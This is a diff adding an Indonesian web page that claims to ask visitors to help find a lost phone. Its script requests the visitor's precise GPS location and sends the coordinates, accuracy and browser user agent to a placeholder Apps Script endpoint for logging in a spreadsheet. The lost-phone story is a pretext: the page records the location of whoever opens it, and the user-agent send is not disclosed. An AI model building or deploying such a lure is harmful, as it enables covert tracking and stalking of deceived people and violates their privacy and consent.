@@ -1,0 +1,61 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Bantu Temukan HP</title>
+  <style>
+    body { font-family: Arial; padding:20px; max-width:600px; margin:auto; }
+    .box { padding:15px; border:1px solid #ccc; border-radius:10px; background:#fafafa; }
+  </style>
+</head>
+<body>
+  <h2>Mohon Bantu Temukan HP Hilang</h2>
+  <div class="box">
+    <p>Silakan tekan <b>Allow / Izinkan</b> saat muncul permintaan lokasi.</p>
+    <p id="status">Menunggu izin lokasi...</p>
+    <div id="result"></div>
+  </div>
+
+<script>
+const ENDPOINT = "YOUR_WEBAPP_URL_HERE"; // GANTI dengan URL Apps Script
+
+function sendToSheet(lat, lon, acc){
+  fetch(ENDPOINT, {
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({
+      lat: lat,
+      lon: lon,
+      accuracy: acc,
+      ua: navigator.userAgent
+    })
+  }).then(r=>r.json()).then(console.log);
+}
+
+function success(pos){
+  const lat = pos.coords.latitude;
+  const lon = pos.coords.longitude;
+  const acc = pos.coords.accuracy;
+
+  document.getElementById("status").textContent = "Lokasi berhasil diperoleh.";
+  document.getElementById("result").innerHTML = `
+    Koordinat: <b>${lat}, ${lon}</b><br>
+    Akurasi: <b>${acc} meter</b><br><br>
+    <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Buka di Google Maps</a>
+  `;
+
+  sendToSheet(lat, lon, acc);
+}
+
+function error(err){
+  document.getElementById("status").textContent =
+    "Gagal memperoleh lokasi: " + err.message;
+}
+
+navigator.geolocation.getCurrentPosition(success, error, {
+  enableHighAccuracy: true,
+  timeout: 20000
+});
+</script>
+</body>
+</html>
